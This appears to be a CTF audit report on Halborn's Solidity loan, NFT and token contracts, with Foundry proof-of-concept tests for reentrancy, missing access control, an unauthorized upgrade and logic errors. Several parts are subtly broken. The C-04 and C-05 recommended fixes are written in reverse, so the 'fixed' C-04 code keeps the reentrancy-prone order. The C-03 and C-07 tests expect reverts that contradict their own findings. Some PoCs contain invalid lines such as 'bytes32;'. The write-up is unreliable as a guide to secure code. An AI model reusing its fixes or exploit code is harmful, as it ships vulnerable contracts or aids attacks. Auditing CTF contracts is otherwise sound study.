



## **Critical Issues**

### **C-01: `returnLoan` Increases User Debt Instead of Reducing It**
- **Link:** [HalbornLoans.sol#L70](https://github.com/HalbornSecurity/CTFs/blob/6bc8cc1c8f5ac6c75a21da6d5ef7043f0862603b/HalbornCTF_Solidity_Ethereum/src/HalbornLoans.sol#L70)

### **Description:**
The `returnLoan` function incorrectly **increases** user debt instead of reducing it:
```soldity
usedCollateral[msg.sender] += amount;
```


### POC

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/HalbornLoans.sol";
import "../src/HalbornToken.sol";
import "../src/HalbornNFT.sol";

contract HalbornLoansTest is Test {
    HalbornLoans loanContract;
    HalbornToken token;
    HalbornNFT nft;

    function setUp() public {
        token = new HalbornToken();
        nft = new HalbornNFT();
        loanContract = new HalbornLoans(1 ether);

        // Initialize contracts
        loanContract.initialize(address(token), address(nft));
    }

    function testReturnLoanVulnerability() public {
        // Mint NFT to the test contract and deposit it as collateral
        nft.mint(address(this), 1);
        nft.approve(address(loanContract), 1);
        loanContract.depositNFTCollateral(1);

        // Take out a loan
        loanContract.getLoan(1 ether);

        // Repay the loan (vulnerable logic increases debt)
        loanContract.returnLoan(1 ether);

        // Check that debt has increased instead of being cleared
        uint256 debt = loanContract.usedCollateral(address(this));
        assertEq(debt, 2 ether, "Debt should have decreased but it increased");
    }
}
```
### Explanation of the PoC

#### Setup:
- The user deposits an NFT as collateral and takes out a loan of 1 ether.

#### Loan Repayment:
- The user attempts to repay the loan by calling the `returnLoan` function.

#### Exploit:
- Due to incorrect logic, the `returnLoan` function **increases the user's debt** rather than reducing it.
- As a result, the `usedCollateral` mapping reflects an **inflated debt amount**.



### **Recommendation:**
Fix the logic by subtracting the repayment amount:

```solidity 
- usedCollateral[msg.sender] += amount;
```

to
``` solidity
+ usedCollateral[msg.sender] -= amount;
```

---



### **C-02: Unauthorized Access to `setMerkleRoot` Allows Arbitrary Changes**
- **Link:** [HalbornNFT.sol#L41](https://github.com/HalbornSecurity/CTFs/blob/6bc8cc1c8f5ac6c75a21da6d5ef7043f0862603b/HalbornCTF_Solidity_Ethereum/src/HalbornNFT.sol#L41)

### **Description:**
The `setMerkleRoot` function lacks an **authorization check**, allowing **any user** to modify the Merkle root, compromising the integrity of the NFT minting process.

```solidity
function setMerkleRoot(bytes32 merkleRoot_) public {
    merkleRoot = merkleRoot_;
}
```

### POC

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/HalbornNFT.sol";

contract HalbornNFTTest is Test {
    HalbornNFT nft;

    function setUp() public {
        nft = new HalbornNFT();
        nft.initialize(bytes32(0), 1 ether);
    }

    function testUnauthorizedMerkleRootUpdate() public {
        // Attempt to set a new Merkle root without authorization
        bytes32 maliciousRoot = keccak256(abi.encodePacked("malicious"));
        nft.setMerkleRoot(maliciousRoot);

        // Verify the Merkle root has been changed
        assertEq(nft.merkleRoot(), maliciousRoot, "Merkle root should be updated");
    }
}
```

### Explanation of the PoC

#### Setup:
- A new instance of the `HalbornNFT` contract is initialized with a default Merkle root.

#### **Exploit:**
- Any user (including unauthorized ones) can call `setMerkleRoot` and set a malicious Merkle root.
- This allows the attacker to control which addresses are eligible for NFT minting.


### **Recommendation:**
Restrict access to the `setMerkleRoot` function by adding the `onlyOwner` modifier, ensuring only the contract owner can modify the Merkle root.

```solidity 
- function setMerkleRoot(bytes32 merkleRoot_) public {
```

to
``` solidity
+ function setMerkleRoot(bytes32 merkleRoot_) public onlyOwner {
```
---


### **C-03: Incorrect Loan Logic in `getLoan` Function Allows Excessive Loans**
- **Link:** [HalbornLoans.sol#L60](https://github.com/HalbornSecurity/CTFs/blob/6bc8cc1c8f5ac6c75a21da6d5ef7043f0862603b/HalbornCTF_Solidity_Ethereum/src/HalbornLoans.sol#L60)

### **Description:**
The `getLoan` function contains a flawed logic check:

```solidity
totalCollateral[msg.sender] - usedCollateral[msg.sender] < amount;

```
This logic incorrectly determines if the user's available collateral is less than the requested loan amount. As a result:

- Users can only get loans greater than their deposited collateral.
- There is no upper limit, meaning users can theoretically mint a maximum amount (type(uint256).max).

### POC

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/HalbornLoans.sol";
import "../src/HalbornToken.sol";
import "../src/HalbornNFT.sol";

contract HalbornLoansTest is Test {
    HalbornLoans loanContract;
    HalbornToken token;
    HalbornNFT nft;

    function setUp() public {
        token = new HalbornToken();
        nft = new HalbornNFT();
        loanContract = new HalbornLoans(1 ether);

        // Initialize the loan contract with the token and NFT addresses
        loanContract.initialize(address(token), address(nft));

        // Mint an NFT to the test contract and deposit it as collateral
        nft.mint(address(this), 1);
        nft.approve(address(loanContract), 1);
        loanContract.depositNFTCollateral(1);
    }

    function testExcessiveLoanExploit() public {
        // Attempt to take out a loan larger than the collateral (exploit)
        vm.expectRevert("Not enough collateral");
        loanContract.getLoan(2 ether);

        // Take out a valid loan within collateral limits (1 ether)
        loanContract.getLoan(1 ether);

        // Try to take another loan (which exceeds the remaining collateral)
        vm.expectRevert("Not enough collateral");
        loanContract.getLoan(1 ether);
    }
}

```

### Explanation of the PoC

#### Setup:
- The user deposits an NFT with a value of 1 ether as collateral.

#### **Exploit:**
- The user attempts to take a loan of 2 ether, which exceeds the available collateral.
- The current logic allows this exploit due to the incorrect < operator.

#### Valid Loan:
- A loan of 1 ether is successfully taken out, as it matches the available collateral.
---

### **Recommendation:**
To ensure users can only borrow up to the value of their collateral, change the < operator to >=:

```solidity 
- totalCollateral[msg.sender] - usedCollateral[msg.sender] < amount;```
```
to
``` solidity
+ totalCollateral[msg.sender] - usedCollateral[msg.sender] >= amount;
```

---

### **C-04: User Can Exit the Protocol with Both Their NFT and a Loan**
- **Link:** [HalbornLoans.sol#L53](https://github.com/HalbornSecurity/CTFs/blob/6bc8cc1c8f5ac6c75a21da6d5ef7043f0862603b/HalbornCTF_Solidity_Ethereum/src/HalbornLoans.sol#L53)

### **Description:**
The `withdrawCollateral` function fails to follow the **Checks-Effects-Interactions (CEI)** pattern, creating a vulnerability. Specifically, the `safeTransferFrom` call hands back control to the user if it is a contract. This opens up the possibility for a **reentrancy attack**, where a malicious user can take out a loan **before their collateral is properly decreased**.



### POC

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/HalbornLoans.sol";
import "../src/HalbornToken.sol";
import "../src/HalbornNFT.sol";

contract MaliciousContract {
    HalbornLoans public loans;
    HalbornToken public token;

    constructor(address _loans, address _token) {
        loans = HalbornLoans(_loans);
        token = HalbornToken(_token);
    }

    // Reentrancy attack: Withdraw NFT and get loan before collateral decreases
    function attack(uint256 nftId, uint256 loanAmount) external {
        loans.withdrawCollateral(nftId); // Triggers reentrancy
        loans.getLoan(loanAmount); // Take a loan during reentrancy
    }

    // Receive function to accept NFTs during the reentrancy attack
    receive() external payable {}
}

contract HalbornLoansTest is Test {
    HalbornLoans loanContract;
    HalbornToken token;
    HalbornNFT nft;
    MaliciousContract attacker;

    function setUp() public {
        token = new HalbornToken();
        nft = new HalbornNFT();
        loanContract = new HalbornLoans(1 ether);

        // Initialize contracts
        loanContract.initialize(address(token), address(nft));

        // Deploy malicious contract
        attacker = new MaliciousContract(address(loanContract), address(token));

        // Mint an NFT to the attacker and approve the loan contract
        nft.mint(address(attacker), 1);
        vm.prank(address(attacker));
        nft.approve(address(loanContract), 1);

        // Attacker deposits NFT as collateral
        vm.prank(address(attacker));
        loanContract.depositNFTCollateral(1);
    }

    function testReentrancyAttack() public {
        // Attacker tries to withdraw NFT and take a loan in the same transaction
        vm.prank(address(attacker));
        attacker.attack(1, 1 ether);

        // Check the attacker's balance after the exploit
        uint256 attackerBalance = token.balanceOf(address(attacker));
        assertEq(attackerBalance, 1 ether, "Attacker should have stolen 1 ether");

        // Verify the NFT is no longer in the loan contract
        assertEq(nft.ownerOf(1), address(attacker), "Attacker should own the NFT");

        // Confirm that collateral was not properly decreased
        uint256 collateral = loanContract.totalCollateral(address(attacker));
        assertEq(collateral, 1 ether, "Collateral should not have been decreased");
    }
}

```

### Explanation of the PoC

#### Setup:
- The attacker deposits an NFT as collateral through the HalbornLoans contract.
- A malicious contract is deployed to perform a reentrancy attack.


#### **Exploit:**
- The attacker’s malicious contract calls withdrawCollateral to reclaim the NFT.
- During the external call (safeTransferFrom), the attacker triggers the reentrancy attack and takes a loan.
- Since the collateral was not yet decreased, the attacker exits with both the loan and the NFT.


### **Recommendation:**

Reorder the operations to follow the CEI pattern:


```solidity
 totalCollateral[msg.sender] -= collateralPrice;
 delete idsCollateral[id];
 nft.safeTransferFrom(address(this), msg.sender, id);
```
to
``` solidity
nft.safeTransferFrom(address(this), msg.sender, id);
totalCollateral[msg.sender] -= collateralPrice;
delete idsCollateral[id];
```

---

### C-05:`depositNFTCollateral` Function Prevents NFT Deposits 
- **Link:** link

### **Description:**
The `depositNFTCollateral` function fails to accept NFT deposits due to the contract not implementing the necessary interface to handle NFT transfers. When the `safeTransferFrom` function is called, it checks if the recipient is a contract. If it is, the ERC721 standard requires that the recipient implements the `onERC721Received` function. Since the `HalbornLoans` contract does not implement this function, the call to deposit NFTs will revert, effectively blocking any NFT deposits.


### POC

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/HalbornLoans.sol";
import "../src/HalbornNFT.sol";

contract HalbornLoansTest is Test {
    HalbornLoans loanContract;
    HalbornNFT nft;

    function setUp() public {
        nft = new HalbornNFT();
        loanContract = new HalbornLoans(1 ether);

        // Initialize contracts
        loanContract.initialize(address(0), address(nft));

        // Mint NFT to the test contract and approve it for the loan contract
        nft.mint(address(this), 1);
        nft.approve(address(loanContract), 1);
    }

    function testDepositNFTCollateral() public {
        // Attempt to deposit the NFT as collateral
        vm.expectRevert("ERC721: transfer to non ERC721Receiver implementer");
        loanContract.depositNFTCollateral(1);
    }
}

```

### Explanation of the PoC

#### Setup:
- The test deploys the HalbornLoans contract and the HalbornNFT contract.
- An NFT is minted to the test contract and approved for use by the HalbornLoans contract.
#### **Exploit:**
- When attempting to deposit the NFT using depositNFTCollateral, the transaction fails due to the contract not implementing IERC721Receiver.
- The test expects the transaction to revert with an error indicating that the receiving contract does not implement the necessary ERC721Receiver interface.


### **Recommendation:**
To fix this issue, the `HalbornLoans` contract must implement the `IERC721Receiver` interface from OpenZeppelin, allowing it to properly handle incoming NFT transfers. Specifically, the `onERC721Received` function needs to be implemented.

#### Solution:

1. Update the contract to extend `IERC721ReceiverUpgradeable`:
    ```solidity
    contract HalbornLoans is Initializable, UUPSUpgradeable, MulticallUpgradeable, IERC721ReceiverUpgradeable {
   ```
    to
    ```solidity
    contract HalbornLoans is Initializable, UUPSUpgradeable, MulticallUpgradeable {
    ```

2. Implement the `onERC721Received` function:
    ```solidity
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        return this.onERC721Received.selector;
    }
    ```
---

### **C-06: `mintAirdrops` Function Reverts on Non-Minted Tokens**
- **Link:** [HalbornNFT.sol#L46](https://github.com/HalbornSecurity/CTFs/blob/6bc8cc1c8f5ac6c75a21da6d5ef7043f0862603b/HalbornCTF_Solidity_Ethereum/src/HalbornNFT.sol#L46)

### **Description:**
In the `mintAirdrops` function, the following check is performed to verify if a token ID has already been minted:

```solidity
require(_exists(id), "Token already minted");

```
This logic is incorrect because _exists(id) will return false if the token has not yet been minted. As a result, the require statement will revert the transaction when trying to mint a new token, meaning users can only pass the check if they attempt to mint an already minted NFT, which is not the desired behavior.


- 

### POC

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/HalbornNFT.sol";

contract HalbornNFTTest is Test {
    HalbornNFT nft;

    function setUp() public {
        nft = new HalbornNFT();
        nft.initialize(bytes32(0), 1 ether);
    }

    function testMintAirdropFailsForNonMintedToken() public {
        // Attempt to mint a token that does not exist yet
        bytes32; // Simulating empty Merkle proof
        vm.expectRevert("Token already minted");
        nft.mintAirdrops(1, proof);
    }
}

```

### Explanation of the PoC

#### Setup:
- The test deploys the HalbornNFT contract and simulates an attempt to mint an airdrop token.

#### **Exploit:**
- When attempting to mint a new token, the transaction reverts because the _exists(id) check incorrectly prevents minting of non-existent tokens.
  


### **Recommendation:**
To fix this issue, the logic should be inverted so that the minting process checks if the token does not already exist before allowing minting. So, needs to be a update to the require statement in the mintAirdrops function.
```solidity
require(_exists(id), "Token already minted");
```
to
``` solidity
require(!_exists(id), "Token already minted");
```
This ensures that the function allows minting of tokens that have not yet been minted, and reverts only if a user tries to mint a token that has already been minted.

---

### **C-07: `_authorizeUpgrade` Lacks Authorization Checks**
- **Link:**
  - [HalbornLoans.sol](https://github.com/HalbornSecurity/CTFs/blob/master/HalbornCTF_Solidity_Ethereum/src/HalbornLoans.sol)
  - [HalbornNFT.sol](https://github.com/HalbornSecurity/CTFs/blob/master/HalbornCTF_Solidity_Ethereum/src/HalbornNFT.sol)
  - [HalbornToken.sol](https://github.com/HalbornSecurity/CTFs/blob/master/HalbornCTF_Solidity_Ethereum/src/HalbornToken.sol)

### **Description:**
The `_authorizeUpgrade` function, inherited from the UUPSUpgradeable contract in OpenZeppelin, **lacks proper authorization checks**. Without these checks, **any user** can call the `upgradeTo` function to upgrade the contract. This creates a significant vulnerability, as unauthorized users could potentially upgrade the contract to malicious code.
According to [OpenZeppelin's official documentation](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/789ba4f167cc94088e305d78e4ae6f3c1ec2e6f1/contracts/proxy/utils/UUPSUpgradeable.sol#L122-L131), the `_authorizeUpgrade` function must include authorization logic to ensure only authorized users (typically the owner) can perform upgrades.


### POC

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/HalbornLoans.sol";
import "openzeppelin-contracts-upgradeable/contracts/proxy/utils/UUPSUpgradeable.sol";

contract MaliciousUpgrade is HalbornLoans {
    function getMaliciousData() public pure returns (string memory) {
        return "This is malicious code!";
    }
}

contract HalbornLoansTest is Test {
    HalbornLoans loanContract;
    MaliciousUpgrade maliciousContract;
    address owner = address(1);
    address attacker = address(2);

    function setUp() public {
        // Deploy the original contract
        loanContract = new HalbornLoans(1 ether);
        loanContract.initialize(address(0), address(0));

        // Deploy the malicious contract
        maliciousContract = new MaliciousUpgrade();

        // Set up the contract with the owner
        vm.startPrank(owner);
        loanContract.transferOwnership(owner);
        vm.stopPrank();
    }

    function testUnauthorizedUpgrade() public {
        // Simulate attacker attempting to upgrade the contract
        vm.startPrank(attacker);
        vm.expectRevert("Ownable: caller is not the owner");
        loanContract.upgradeTo(address(maliciousContract)); // Unauthorized upgrade attempt
        vm.stopPrank();
    }
}

```

### Explanation of the PoC

#### Setup:
- The test deploys the original HalbornLoans contract.
- A malicious contract (MaliciousUpgrade) is deployed, containing additional malicious functionality.
- The contract ownership is transferred to a trusted owner account (owner), but an unauthorized user (attacker) attempts to upgrade the contract.
#### **Exploit:**
- Without proper authorization in the _authorizeUpgrade function, any user can call upgradeTo and replace the contract with a malicious version.
- The test simulates this by having the attacker attempt to perform the upgrade, but the function is expected to revert due to a lack of authorization.


### **Recommendation:**
To fix this vulnerability, the `_authorizeUpgrade` function should be overridden and include the `onlyOwner` modifier or similar access control mechanism to ensure that only the contract owner can authorize upgrades.

```solidity
function _authorizeUpgrade(address) internal override {}
```
to
``` solidity
function _authorizeUpgrade(address) internal override onlyOwner {}
```
By adding the onlyOwner modifier, only the contract owner will be able to authorize upgrades, significantly reducing the risk of unauthorized contract changes.

---

### **C-08: `mintBuyWithEth` May Become Unusable for NFT Minting**
- **Link:** [HalbornNFT.sol#L59-L67](https://github.com/HalbornSecurity/CTFs/blob/6bc8cc1c8f5ac6c75a21da6d5ef7043f0862603b/HalbornCTF_Solidity_Ethereum/src/HalbornNFT.sol#L59-L67)


### **Issue:**
The `mintBuyWithEth` function uses an `idCounter` to generate new NFT IDs by incrementing the counter before minting. However, it does not account for the possibility that an NFT with the same ID might already exist due to the `mintAirdrops` function, which allows minting NFTs with arbitrary IDs. 

For example, if `mintAirdrops` mints an NFT with ID 1, and then `mintBuyWithEth` increments `idCounter` to 1, the function will fail because an NFT with that ID already exists. As a result, the `mintBuyWithEth` function will **become unusable**, as it will keep attempting to mint NFTs with IDs that have already been assigned.

This issue can effectively **brick the minting process**, preventing any new NFTs from being minted via `mintBuyWithEth`.


### POC

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/HalbornNFT.sol";

contract HalbornNFTTest is Test {
    HalbornNFT nft;

    function setUp() public {
        nft = new HalbornNFT();
        nft.initialize(bytes32(0), 1 ether);

        // Simulate airdrop minting an NFT with ID 1
        bytes32;
        nft.mintAirdrops(1, proof);
    }

    function testMintBuyWithEthFailsDueToDuplicateID() public {
        // Increment the idCounter to 1 (same as the airdropped NFT)
        vm.prank(address(this));
        vm.deal(address(this), 1 ether);

        // Attempt to mint via mintBuyWithEth, but it will fail due to ID collision
        vm.expectRevert("ERC721: token already minted");
        nft.mintBuyWithETH{value: 1 ether}();
    }
}

```

### Explanation of the PoC

#### Setup:
- The test deploys the HalbornNFT contract and mints an NFT with ID 1 using mintAirdrops.
-The mintBuyWithEth function is then called, which increments idCounter to 1 and attempts to mint another NFT with the same ID.

#### **Exploit:**
- The second mint attempt fails because an NFT with ID 1 already exists, leading to a transaction revert due to the ID collision.
  

### **Recommendation:**

There is no simple fix for this issue because `mintAirdrops` can mint NFTs with arbitrary IDs, while `mintBuyWithEth` relies on a sequential counter. Several potential solutions could be implemented:


#### **Off-Chain ID Management:**
- Keep track of minted IDs off-chain using a database or API. Users could interact with the API to request an available ID when minting via `mintBuyWithEth`.


#### **Rework Minting Logic:**
- Rework both the `mintAirdrops` and `mintBuyWithEth` functions to use a **shared pool** of available IDs. For example, you could predefine a range of IDs for each function to ensure no overlap between the two minting processes.


#### **ID Randomization:**
- Implement a random or hashed ID generation system to prevent collisions. However, this method might still require tracking which IDs have already been minted to avoid duplications.


Each of these solutions provides a way to manage ID collisions and maintain the functionality of both minting processes, ensuring NFTs can be minted without breaking the contract.

---

## **High Issues**

### **H-01: Token Loan Amount Incorrectly Assumed to Be Equal to `collateralPrice`**

- **Link:** [HalbornLoans.sol](https://github.com/HalbornSecurity/CTFs/blob/master/HalbornCTF_Solidity_Ethereum/src/HalbornLoans.sol)


### **Description:**
The `getLoan` function assumes that the value of the collateral (e.g., an NFT) is always equivalent to the `collateralPrice` (e.g., 2 Ether) and mints tokens accordingly. The function does not take into account market fluctuations in the value of the tokens or the collateral. 

For example:
- If the `collateralPrice` is 2 Ether, the user will receive 2 HalbornTokens (assuming 1:1 token to Ether).
- However, if the market value of the tokens increases or decreases due to external trading (e.g., on decentralized exchanges), the tokens might be worth significantly more or less than the collateral.

This creates two main vulnerabilities:
1. **Overvalued Loans:** If token prices rise, users can take out loans worth more than their collateral and have no incentive to repay the loan.
2. **Undervalued Loans:** If token prices drop, users will receive less value from their collateral, making the loan process unattractive.


### **Proof of Concept (PoC):**

#### **Step-by-Step Explanation of the Vulnerability:**

1. **User Deposits NFT as Collateral:**
   - A user deposits an NFT valued at 2 Ether (based on the `collateralPrice`).
   
2. **Token Value Fluctuation:**
   - The `getLoan` function mints 2 HalbornTokens (1 token per Ether), assuming the price is always 2 Ether. However, due to market fluctuations, the value of each token increases on external markets (e.g., 1 token now equals 2 Ether).

3. **User Receives a Loan:**
   - The user takes out a loan of 2 HalbornTokens.
   
4. **Value Imbalance:**
   - The user now has tokens worth 4 Ether in total (2 tokens at 2 Ether each) but only deposited 2 Ether worth of collateral.
   - The user has no incentive to repay the loan, as the value of the loaned tokens exceeds the collateral.

5. **Loss to the Protocol:**
   - The protocol suffers a loss because the collateral (NFT) is no longer worth the value of the loaned tokens, leading to potential bad debt in the system.


### **Recommendation:**
To address this issue, the loan system should dynamically calculate the loan value based on the **current market value** of both the collateral and the tokens, rather than relying on a static `collateralPrice`. This can be achieved using an **oracle** or a similar pricing mechanism to ensure accurate loan amounts.

#### Solution:
1. **Integrate an Oracle:**
   - Use a price oracle to track the real-time market value of both the collateral (NFT) and the token being loaned.
   
2. **Dynamic Loan Calculation:**
   - Modify the `getLoan` function to mint tokens based on the real-time market value of the collateral rather than assuming a fixed price.

---

### **H-02: Missing Liquidation Logic**

- **Link:** [HalbornLoans.sol](https://github.com/HalbornSecurity/CTFs/blob/master/HalbornCTF_Solidity_Ethereum/src/HalbornLoans.sol)


### **Description:**
The `HalbornLoans` contract currently lacks **liquidation logic**, meaning that if users accrue bad debt (i.e., their loan value exceeds the value of their collateral), there is no mechanism in place to recover losses for the protocol. Without this, users who default on their loans may leave the protocol with unrecoverable debt, causing significant financial loss.

Proper liquidation logic would allow the protocol to seize and sell the collateral (e.g., NFTs) from users who have defaulted, ensuring that some or all of the losses can be recouped.


### **Proof of Concept (PoC):**

#### **Step-by-Step Explanation of the Vulnerability:**

1. **User Takes a Loan:**
   - A user deposits collateral (an NFT) worth 2 Ether and takes a loan based on this collateral.

2. **Collateral Value Drops:**
   - Due to market conditions, the value of the collateral drops, making the loan value greater than the collateral. For example, the NFT may now be worth 1.5 Ether, while the loan amount remains 2 Ether.

3. **Bad Debt Accrual:**
   - Since the loan value exceeds the collateral, the protocol is at risk of incurring bad debt if the user defaults and chooses not to repay the loan.

4. **No Liquidation Mechanism:**
   - Without a liquidation mechanism, the protocol has no way to seize the NFT and recoup the loaned tokens, leaving the protocol with an unrecoverable loss.


### **Recommendation:**
To address this issue, liquidation logic should be implemented to automatically **seize and sell collateral** (e.g., NFTs) when the loan value exceeds a certain threshold (such as 80% of the collateral value). This would allow the protocol to recover part or all of the loan in case of a default.

#### Solution:
1. **Add a Liquidation Function:**
   - Introduce a function that calculates when a user's loan-to-collateral ratio (LTV) exceeds a dangerous threshold (e.g., 80%) and triggers liquidation of the collateral.
2. **Define a Liquidation Threshold:**
   - Set a threshold, such as 80% LTV, to trigger liquidation when a loan exceeds a certain percentage of the collateral's value.

---

## **H-03: Loans Have a 100% Loan-to-Value (LTV) Ratio, Leading to Potential Bad Debt**

- **Link:** [HalbornLoans.sol](https://github.com/HalbornSecurity/CTFs/blob/master/HalbornCTF_Solidity_Ethereum/src/HalbornLoans.sol)


### **Description:**
The current loan system allows users to take out loans with an LTV (Loan-to-Value) ratio of 100%, meaning users can borrow tokens equivalent to the full value of their collateral. This creates a significant risk of **bad debt** if the value of the loaned tokens increases.

For example:
- If a user takes out a loan worth $1,000 and the token price increases to $1,010, the user now has tokens worth more than the value of the collateral. In such a scenario, the user has no incentive to repay the loan, leading to bad debt for the protocol.
- The collateral (e.g., an NFT) remains locked in the protocol, while the user holds tokens worth more than the collateral.

This results in the protocol accruing bad debt, as it has issued tokens that exceed the collateral's value, and the user may choose not to repay the loan.

### **Proof of Concept (PoC):**

#### **Step-by-Step Explanation of the Vulnerability:**

1. **User Takes a Loan:**
   - A user deposits collateral (e.g., an NFT) worth $1,000 and takes out a loan of $1,000 worth of tokens (100% LTV).

2. **Token Value Increases:**
   - Due to external market conditions, the price of the tokens rises, and the user’s loan now holds a value of $1,010.

3. **User Keeps the Loan:**
   - The user has no incentive to repay the loan, as it would be a financial loss for them. The protocol has now issued tokens worth more than the collateral, and the collateral is stuck in the system.

4. **Protocol Accrues Bad Debt:**
   - The protocol is left with bad debt, as the user is unlikely to repay the loan, and the collateral’s value does not cover the loaned tokens.


### **Recommendation:**
To mitigate the risk of bad debt, the protocol should implement an LTV ratio that is lower than 100%, ideally between **70-80%**, which is common practice in other protocols. This ensures that the loan value is always lower than the collateral, giving users an incentive to repay loans even if token prices fluctuate.

#### Solution:
1. **Implement a Lower LTV Ratio:**
   - Add an LTV ratio that limits how much a user can borrow based on the value of their collateral.
     
2. **Adjust Loan Amount Based on Real-Time Prices:**
   - Use an oracle to determine the current market value of the collateral and calculate the maximum loan amount based on the LTV ratio.

---

## **Medium Issues**

### **M-01: `collateralPrice` is a Static Amount**

- **Link:** [HalbornLoans.sol](https://github.com/HalbornSecurity/CTFs/blob/master/HalbornCTF_Solidity_Ethereum/src/HalbornLoans.sol)


### **Description:**
In the `HalbornLoans` contract, the `collateralPrice` is a static value, which means the NFT is always treated as having the same collateral value regardless of its actual market price. For example, whether the NFT is worth 1 Ether or 0.1 Ether, the loan amount remains the same. This leads to significant price fluctuations and imbalances where some users profit while others may incur losses. 


### **Recommendation:**
There are two potential solutions:
1. **Make `collateralPrice` Immutable:** This would preserve the collateral-to-loan ratio and prevent fluctuations in value.
2. **Add a Setter for `collateralPrice`:** Allow dynamic pricing with a setter function, ensuring that any price change maintains the same ratio across all loans.

---

## **M-02: Possible Second Preimage Attack in Merkle Tree**

- **Link:** [HalbornNFT.sol](https://github.com/HalbornSecurity/CTFs/blob/6bc8cc1c8f5ac6c75a21da6d5ef7043f0862603b/HalbornCTF_Solidity_Ethereum/src/HalbornNFT.sol#L45)

### **Description:**
The contract is vulnerable to a **second preimage attack** within the Merkle tree structure. In this attack, an adversary attempts to create a new piece of data (a leaf node) that produces the same hash value as an existing leaf node without modifying the original data. This could lead to security breaches in verifying legitimate users or transactions.


### **Recommendation:**
To mitigate this vulnerability, review the Merkle tree implementation and follow best practices to prevent second preimage attacks. The following [article by Rareskills](https://rareskills.io) provides an in-depth explanation of this type of attack and the appropriate preventive measures.

---
## **Informative Issues**

### **I-01: Missing Storage Gap in Upgradeable Contracts (OZ Version >5.0)**

### **Description:**
OpenZeppelin (OZ) upgradeable contracts in versions **greater than 5.0** utilize **Namespaced Storage**, while older versions leave storage gaps. If the protocol upgrades to a newer OZ version without accounting for these gaps, it could lead to issues when deploying new versions of the contract, potentially causing storage collisions or corrupting the contract state.


### **Recommendation:**
When using upgradeable contracts in OZ versions greater than 5.0, ensure that a storage gap is added to the contracts to maintain compatibility and prevent any issues during future upgrades.

---

### **I-02: MulticallUpgradeable Does Not Identify Non-Canonical Context**

### **Description:**
The OpenZeppelin implementation of `MulticallUpgradeable` does not fully account for **non-canonical context** when handling multiple calls in a single transaction. Specifically, the Halborn contracts interact with the caller's address (`msg.sender`), but since all contracts are upgradeable, proper context handling with `_msgSender()` should be considered to ensure that the protocol behaves correctly in future upgrades.

---

### **Recommendation:**
Implement context preservation using `_msgSender()` to ensure maximum safety in future contract versions, particularly for contracts utilizing `MulticallUpgradeable`. This ensures that the proper message sender context is maintained across different versions and upgrades.

